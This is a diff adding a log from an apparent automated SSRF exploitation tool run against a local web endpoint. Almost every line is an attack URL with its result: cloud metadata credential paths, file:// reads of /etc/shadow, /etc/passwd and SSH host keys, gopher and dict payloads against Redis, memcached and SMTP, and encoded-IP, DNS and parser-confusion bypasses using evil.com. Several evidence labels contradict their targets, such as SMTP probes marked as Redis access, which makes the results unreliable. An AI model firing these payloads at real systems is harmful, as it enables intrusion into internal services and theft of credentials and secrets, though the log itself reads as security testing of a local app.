@@ -1,0 +1,202 @@
+[2025-10-26 23:30:44] [INFO] Starting comprehensive SSRF exploitation test against: http://localhost:5000/get
+[2025-10-26 23:30:44] [INFO] Starting internal service enumeration...
+[2025-10-26 23:30:44] [INFO] Running Internal Service Enumeration - 30 test cases...
+[2025-10-26 23:30:46] [INFO] ✅ Tested: Localhost access: http://0.0.0.0/ - Status: 500
+[2025-10-26 23:30:46] [CRITICAL] 🚨 VULNERABILITY FOUND: Router admin interface
+[2025-10-26 23:30:46] [CRITICAL]     URL: http://192.168.1.1/
+[2025-10-26 23:30:46] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:30:46] [INFO] ✅ Tested: Localhost access: http://127.1/ - Status: 500
+[2025-10-26 23:30:46] [INFO] ✅ Tested: Localhost access: http://127.0.1/ - Status: 500
+[2025-10-26 23:30:46] [CRITICAL] 🚨 VULNERABILITY FOUND: Localhost access: http://127.0.0.1/
+[2025-10-26 23:30:46] [CRITICAL]     URL: http://127.0.0.1/
+[2025-10-26 23:30:46] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:30:46] [CRITICAL] 🚨 VULNERABILITY FOUND: Localhost access: http://127.0.0.1:80/
+[2025-10-26 23:30:46] [CRITICAL]     URL: http://127.0.0.1:80/
+[2025-10-26 23:30:46] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:30:48] [INFO] ✅ Tested: Localhost access: http://[::1]/ - Status: 500
+[2025-10-26 23:30:48] [CRITICAL] 🚨 VULNERABILITY FOUND: Localhost access: http://localhost/
+[2025-10-26 23:30:48] [CRITICAL]     URL: http://localhost/
+[2025-10-26 23:30:48] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:30:48] [INFO] ✅ Tested: GCP Metadata service - Status: 500
+[2025-10-26 23:30:50] [CRITICAL] 🚨 VULNERABILITY FOUND: Local port 80
+[2025-10-26 23:30:50] [CRITICAL]     URL: http://127.0.0.1:80/
+[2025-10-26 23:30:50] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:30:50] [INFO] ✅ Tested: Localhost access: http://localhost:8080/ - Status: 500
+[2025-10-26 23:30:52] [CRITICAL] 🚨 VULNERABILITY FOUND: Localhost port 80
+[2025-10-26 23:30:52] [CRITICAL]     URL: http://localhost:80/
+[2025-10-26 23:30:52] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:30:52] [INFO] ✅ Tested: Local port 443 - Status: 500
+[2025-10-26 23:30:54] [INFO] ✅ Tested: Local port 8080 - Status: 500
+[2025-10-26 23:30:56] [ERROR] ❌ Error: Internal network gateway - Timeout
+[2025-10-26 23:30:56] [INFO] ✅ Tested: Localhost port 443 - Status: 500
+[2025-10-26 23:30:56] [INFO] ✅ Tested: Local port 8000 - Status: 500
+[2025-10-26 23:30:58] [ERROR] ❌ Error: Corporate network - Timeout
+[2025-10-26 23:30:58] [ERROR] ❌ Error: AWS Metadata service - Timeout
+[2025-10-26 23:30:58] [ERROR] ❌ Error: Alibaba Cloud metadata - Timeout
+[2025-10-26 23:30:58] [ERROR] ❌ Error: Common router IP - Timeout
+[2025-10-26 23:30:58] [ERROR] ❌ Error: Internal network - Timeout
+[2025-10-26 23:30:58] [INFO] ✅ Tested: Localhost port 8080 - Status: 500
+[2025-10-26 23:30:58] [CRITICAL] 🚨 VULNERABILITY FOUND: Local port 5000
+[2025-10-26 23:30:58] [CRITICAL]     URL: http://127.0.0.1:5000/
+[2025-10-26 23:30:58] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 23:31:00] [INFO] ✅ Tested: Local port 3000 - Status: 500
+[2025-10-26 23:31:00] [INFO] ✅ Tested: Localhost port 8000 - Status: 500
+[2025-10-26 23:31:02] [INFO] ✅ Tested: Local port 9000 - Status: 500
+[2025-10-26 23:31:02] [CRITICAL] 🚨 VULNERABILITY FOUND: Localhost port 5000
+[2025-10-26 23:31:02] [CRITICAL]     URL: http://localhost:5000/
+[2025-10-26 23:31:02] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 23:31:02] [INFO] ✅ Tested: Localhost port 3000 - Status: 500
+[2025-10-26 23:31:04] [INFO] ✅ Tested: Localhost port 9000 - Status: 500
+[2025-10-26 23:31:04] [INFO] Completed Internal Service Enumeration: 8/30 vulnerabilities found
+[2025-10-26 23:31:05] [INFO] Testing cloud metadata service access...
+[2025-10-26 23:31:05] [INFO] Running Cloud Metadata Access - 15 test cases...
+[2025-10-26 23:31:07] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/instance/ - Status: 500
+[2025-10-26 23:31:07] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/project/ - Status: 500
+[2025-10-26 23:31:07] [INFO] ✅ Tested: GCP Metadata: http://metadata.google.internal/computeMetadata/v1/ - Status: 500
+[2025-10-26 23:31:17] [ERROR] ❌ Error: AWS Metadata: http://169.254.169.254/latest/meta-data/ - Timeout
+[2025-10-26 23:31:17] [ERROR] ❌ Error: AWS Metadata: http://169.254.169.254/latest/user-data/ - Timeout
+[2025-10-26 23:31:17] [ERROR] ❌ Error: AWS Metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/ - Timeout
+[2025-10-26 23:31:17] [ERROR] ❌ Error: AWS Metadata: http://169.254.169.254/latest/meta-data/public-keys/ - Timeout
+[2025-10-26 23:31:17] [ERROR] ❌ Error: AWS Metadata: http://169.254.169.254/latest/meta-data/ami-id - Timeout
+[2025-10-26 23:31:17] [ERROR] ❌ Error: AWS Metadata: http://169.254.169.254/latest/meta-data/hostname - Timeout
+[2025-10-26 23:31:17] [ERROR] ❌ Error: AWS Metadata: http://169.254.169.254/latest/dynamic/instance-identity/document - Timeout
+[2025-10-26 23:31:19] [ERROR] ❌ Error: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/ - Timeout
+[2025-10-26 23:31:19] [ERROR] ❌ Error: Azure Metadata: http://169.254.169.254/metadata/instance - Timeout
+[2025-10-26 23:31:19] [ERROR] ❌ Error: Azure Metadata: http://169.254.169.254/metadata/attested/document - Timeout
+[2025-10-26 23:31:29] [ERROR] ❌ Error: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/id - Timeout
+[2025-10-26 23:31:29] [ERROR] ❌ Error: DigitalOcean Metadata: http://169.254.169.254/metadata/v1/user-data - Timeout
+[2025-10-26 23:31:29] [INFO] Completed Cloud Metadata Access: 0/15 vulnerabilities found
+[2025-10-26 23:31:30] [INFO] Testing dangerous protocol attacks...
+[2025-10-26 23:31:30] [INFO] Running Protocol-Based Attacks - 27 test cases...
+[2025-10-26 23:31:32] [INFO] ✅ Tested: File protocol: file:///etc/shadow - Status: 500
+[2025-10-26 23:31:32] [INFO] ✅ Tested: File protocol: file:///etc/hosts - Status: 500
+[2025-10-26 23:31:32] [INFO] ✅ Tested: File protocol: file:///etc/passwd - Status: 500
+[2025-10-26 23:31:32] [INFO] ✅ Tested: File protocol: file:///proc/self/environ - Status: 500
+[2025-10-26 23:31:32] [CRITICAL] 🚨 VULNERABILITY FOUND: File protocol: file:///c:/windows/win.ini
+[2025-10-26 23:31:32] [CRITICAL]     URL: file:///c:/windows/win.ini
+[2025-10-26 23:31:32] [CRITICAL]     Evidence: File protocol access successful
+[2025-10-26 23:31:32] [INFO] ✅ Tested: File protocol: file:///etc/ssh/ssh_host_rsa_key - Status: 500
+[2025-10-26 23:31:32] [INFO] ✅ Tested: File protocol: file:///c:/boot.ini - Status: 500
+[2025-10-26 23:31:32] [CRITICAL] 🚨 VULNERABILITY FOUND: File protocol: file://test_file.txt
+[2025-10-26 23:31:32] [CRITICAL]     URL: file://test_file.txt
+[2025-10-26 23:31:32] [CRITICAL]     Evidence: File protocol access successful
+[2025-10-26 23:31:32] [INFO] ✅ Tested: File protocol: file://../config.py - Status: 500
+[2025-10-26 23:31:32] [CRITICAL] 🚨 VULNERABILITY FOUND: File protocol: file:///c:/windows/system32/drivers/etc/hosts
+[2025-10-26 23:31:32] [CRITICAL]     URL: file:///c:/windows/system32/drivers/etc/hosts
+[2025-10-26 23:31:32] [CRITICAL]     Evidence: File protocol access successful
+[2025-10-26 23:31:34] [INFO] ✅ Tested: File protocol: file://./app.py - Status: 500
+[2025-10-26 23:31:34] [CRITICAL] 🚨 VULNERABILITY FOUND: Gopher protocol: gopher://127.0.0.1:6379/_INFO
+[2025-10-26 23:31:34] [CRITICAL]     URL: gopher://127.0.0.1:6379/_INFO
+[2025-10-26 23:31:34] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 23:31:34] [CRITICAL] 🚨 VULNERABILITY FOUND: Gopher protocol: gopher://localhost:6379/_KEYS%20*
+[2025-10-26 23:31:34] [CRITICAL]     URL: gopher://localhost:6379/_KEYS%20*
+[2025-10-26 23:31:34] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 23:31:34] [CRITICAL] 🚨 VULNERABILITY FOUND: Gopher protocol: gopher://127.0.0.1:25/_HELO%20localhost
+[2025-10-26 23:31:34] [CRITICAL]     URL: gopher://127.0.0.1:25/_HELO%20localhost
+[2025-10-26 23:31:34] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 23:31:34] [CRITICAL] 🚨 VULNERABILITY FOUND: Gopher protocol: gopher://192.168.1.1:80/_GET%20/%20HTTP/1.0
+[2025-10-26 23:31:34] [CRITICAL]     URL: gopher://192.168.1.1:80/_GET%20/%20HTTP/1.0
+[2025-10-26 23:31:34] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 23:31:34] [CRITICAL] 🚨 VULNERABILITY FOUND: Gopher protocol: gopher://localhost:25/_MAIL%20FROM%3A%20test%40test.com
+[2025-10-26 23:31:34] [CRITICAL]     URL: gopher://localhost:25/_MAIL%20FROM%3A%20test%40test.com
+[2025-10-26 23:31:34] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 23:31:34] [INFO] ✅ Tested: Data URI: data:text/html,<h1>SSRF%20Test</h1> - Status: 200
+[2025-10-26 23:31:34] [INFO] ✅ Tested: Data URI: data:text/plain,SSRF%20Test%20Data - Status: 200
+[2025-10-26 23:31:34] [INFO] ✅ Tested: Data URI: data:text/html,<script>alert("XSS")</script> - Status: 200
+[2025-10-26 23:31:34] [INFO] ✅ Tested: Data URI: data:application/x-php,<?php%20phpinfo();%20?> - Status: 200
+[2025-10-26 23:31:36] [INFO] ✅ Tested: Data URI: data:text/css,body{background:red} - Status: 200
+[2025-10-26 23:31:36] [CRITICAL] 🚨 VULNERABILITY FOUND: Dict protocol: dict://127.0.0.1:11211/stats
+[2025-10-26 23:31:36] [CRITICAL]     URL: dict://127.0.0.1:11211/stats
+[2025-10-26 23:31:36] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 23:31:36] [CRITICAL] 🚨 VULNERABILITY FOUND: Dict protocol: dict://localhost:6379/info
+[2025-10-26 23:31:36] [CRITICAL]     URL: dict://localhost:6379/info
+[2025-10-26 23:31:36] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 23:31:36] [CRITICAL] 🚨 VULNERABILITY FOUND: Dict protocol: dict://192.168.1.1:80/
+[2025-10-26 23:31:36] [CRITICAL]     URL: dict://192.168.1.1:80/
+[2025-10-26 23:31:36] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 23:31:36] [CRITICAL] 🚨 VULNERABILITY FOUND: Phar protocol: phar:///etc/passwd
+[2025-10-26 23:31:36] [CRITICAL]     URL: phar:///etc/passwd
+[2025-10-26 23:31:36] [CRITICAL]     Evidence: Found 'etc/passwd' in response
+[2025-10-26 23:31:36] [INFO] ✅ Tested: Phar protocol: phar://test_file.txt - Status: 200
+[2025-10-26 23:31:36] [INFO] ✅ Tested: Phar protocol: phar://./app.py - Status: 200
+[2025-10-26 23:31:36] [INFO] Completed Protocol-Based Attacks: 12/27 vulnerabilities found
+[2025-10-26 23:31:37] [INFO] Testing SSRF bypass techniques...
+[2025-10-26 23:31:37] [INFO] Running Bypass Techniques - 26 test cases...
+[2025-10-26 23:31:39] [INFO] ✅ Tested: IP encoding: http://0177.0000.0000.0001/ - Status: 500
+[2025-10-26 23:31:39] [INFO] ✅ Tested: IP encoding: http://0x7f.0.0.1/ - Status: 500
+[2025-10-26 23:31:40] [INFO] ✅ Tested: IP encoding: http://0177.0.0.1/ - Status: 500
+[2025-10-26 23:31:40] [INFO] ✅ Tested: IP encoding: http://0x7f.1/ - Status: 500
+[2025-10-26 23:31:40] [CRITICAL] 🚨 VULNERABILITY FOUND: IP encoding: http://0x7f.0x0.0x0.0x1/
+[2025-10-26 23:31:40] [CRITICAL]     URL: http://0x7f.0x0.0x0.0x1/
+[2025-10-26 23:31:40] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:31:41] [INFO] ✅ Tested: IP encoding: http://0x7f000001/ - Status: 500
+[2025-10-26 23:31:42] [INFO] ✅ Tested: IP encoding: http://127.1/ - Status: 500
+[2025-10-26 23:31:42] [INFO] ✅ Tested: IP encoding: http://127.0.1/ - Status: 500
+[2025-10-26 23:31:42] [INFO] ✅ Tested: DNS trick: http://localhost.localdomain/ - Status: 500
+[2025-10-26 23:31:42] [INFO] ✅ Tested: DNS trick: http://subdomain.localhost/ - Status: 500
+[2025-10-26 23:31:42] [CRITICAL] 🚨 VULNERABILITY FOUND: DNS trick: http://localtest.me/
+[2025-10-26 23:31:42] [CRITICAL]     URL: http://localtest.me/
+[2025-10-26 23:31:42] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:31:43] [CRITICAL] 🚨 VULNERABILITY FOUND: DNS trick: http://lvh.me/
+[2025-10-26 23:31:43] [CRITICAL]     URL: http://lvh.me/
+[2025-10-26 23:31:43] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:31:44] [CRITICAL] 🚨 VULNERABILITY FOUND: DNS trick: http://127.0.0.1.nip.io
+[2025-10-26 23:31:44] [CRITICAL]     URL: http://127.0.0.1.nip.io
+[2025-10-26 23:31:44] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:31:44] [CRITICAL] 🚨 VULNERABILITY FOUND: Parser confusion: http://evil.com@127.0.0.1/
+[2025-10-26 23:31:44] [CRITICAL]     URL: http://evil.com@127.0.0.1/
+[2025-10-26 23:31:44] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:31:44] [CRITICAL] 🚨 VULNERABILITY FOUND: Parser confusion: http://127.0.0.1#@evil.com/
+[2025-10-26 23:31:44] [CRITICAL]     URL: http://127.0.0.1#@evil.com/
+[2025-10-26 23:31:44] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:31:44] [CRITICAL] 🚨 VULNERABILITY FOUND: Parser confusion: http://127.0.0.1?@evil.com/
+[2025-10-26 23:31:44] [CRITICAL]     URL: http://127.0.0.1?@evil.com/
+[2025-10-26 23:31:44] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:31:44] [INFO] ✅ Tested: Parser confusion: http://[::]:80/ - Status: 500
+[2025-10-26 23:31:45] [INFO] ✅ Tested: Parser confusion: http://[::ffff:127.0.0.1]/ - Status: 500
+[2025-10-26 23:31:46] [CRITICAL] 🚨 VULNERABILITY FOUND: Case variation: http://127.0.0.1:80/../
+[2025-10-26 23:31:46] [CRITICAL]     URL: http://127.0.0.1:80/../
+[2025-10-26 23:31:46] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:31:46] [INFO] ✅ Tested: Case variation: http://127.0.0.1:80/..;/ - Status: 200
+[2025-10-26 23:31:46] [INFO] ✅ Tested: IP encoding: http://2130706433/ - Status: 500
+[2025-10-26 23:31:46] [INFO] ✅ Tested: IP encoding: http://3232235521/ - Status: 500
+[2025-10-26 23:31:46] [INFO] ✅ Tested: IP encoding: http://16843009/ - Status: 500
+[2025-10-26 23:31:46] [INFO] ✅ Tested: IP encoding: http://0xc0a80001/ - Status: 500
+[2025-10-26 23:31:48] [CRITICAL] 🚨 VULNERABILITY FOUND: Case variation: http://LOCALHOST/
+[2025-10-26 23:31:48] [CRITICAL]     URL: http://LOCALHOST/
+[2025-10-26 23:31:48] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:31:48] [CRITICAL] 🚨 VULNERABILITY FOUND: Case variation: http://LocalHost/
+[2025-10-26 23:31:48] [CRITICAL]     URL: http://LocalHost/
+[2025-10-26 23:31:48] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:31:48] [INFO] Completed Bypass Techniques: 10/26 vulnerabilities found
+[2025-10-26 23:31:49] [INFO] Validating security controls...
+[2025-10-26 23:31:49] [INFO] Running Security Control Validation - 16 test cases...
+[2025-10-26 23:31:51] [INFO] ✅ Tested: Data URI blocking - Status: 200
+[2025-10-26 23:31:51] [CRITICAL] 🚨 VULNERABILITY FOUND: Gopher protocol blocking
+[2025-10-26 23:31:51] [CRITICAL]     URL: gopher://127.0.0.1:6379
+[2025-10-26 23:31:51] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 23:31:51] [INFO] ✅ Tested: File protocol blocking - Status: 500
+[2025-10-26 23:31:51] [CRITICAL] 🚨 VULNERABILITY FOUND: Dict protocol blocking
+[2025-10-26 23:31:51] [CRITICAL]     URL: dict://127.0.0.1:11211
+[2025-10-26 23:31:51] [CRITICAL]     Evidence: Redis service accessed
+[2025-10-26 23:31:51] [INFO] ✅ Tested: Phar protocol blocking - Status: 200
+[2025-10-26 23:31:51] [INFO] ✅ Tested: FTP protocol blocking - Status: 500
+[2025-10-26 23:31:51] [INFO] ✅ Tested: Localhost blocking - Status: 200
+[2025-10-26 23:31:52] [INFO] ✅ Tested: Allowed API endpoint - Status: 200
+[2025-10-26 23:31:52] [INFO] ✅ Tested: Allowed external URL - Status: 200
+[2025-10-26 23:31:53] [INFO] ✅ Tested: Allowed HTTPS URL - Status: 200
+[2025-10-26 23:31:53] [CRITICAL] 🚨 VULNERABILITY FOUND: RFC 1918 blocking
+[2025-10-26 23:31:53] [CRITICAL]     URL: http://192.168.1.1/
+[2025-10-26 23:31:53] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:31:53] [INFO] ✅ Tested: All zeros blocking - Status: 500
+[2025-10-26 23:31:55] [CRITICAL] 🚨 VULNERABILITY FOUND: Localhost hostname blocking
+[2025-10-26 23:31:55] [CRITICAL]     URL: http://localhost/
+[2025-10-26 23:31:55] [CRITICAL]     Evidence: Found 'admin' in response
+[2025-10-26 23:32:03] [ERROR] ❌ Error: Private class A blocking - Timeout
+[2025-10-26 23:32:03] [ERROR] ❌ Error: Private class B blocking - Timeout
+[2025-10-26 23:32:03] [ERROR] ❌ Error: Link-local blocking - Timeout
+[2025-10-26 23:32:03] [INFO] Completed Security Control Validation: 4/16 vulnerabilities found
+[2025-10-26 23:32:04] [INFO] Starting internal network scanning...
+[2025-10-26 23:32:06] [SUCCESS] 🌐 SERVICE FOUND: http://192.168.1.1:80/
+[2025-10-26 23:35:00] [INFO] Generating comprehensive report...
+[2025-10-26 23:35:00] [ERROR] Unexpected error: 'total_tests'
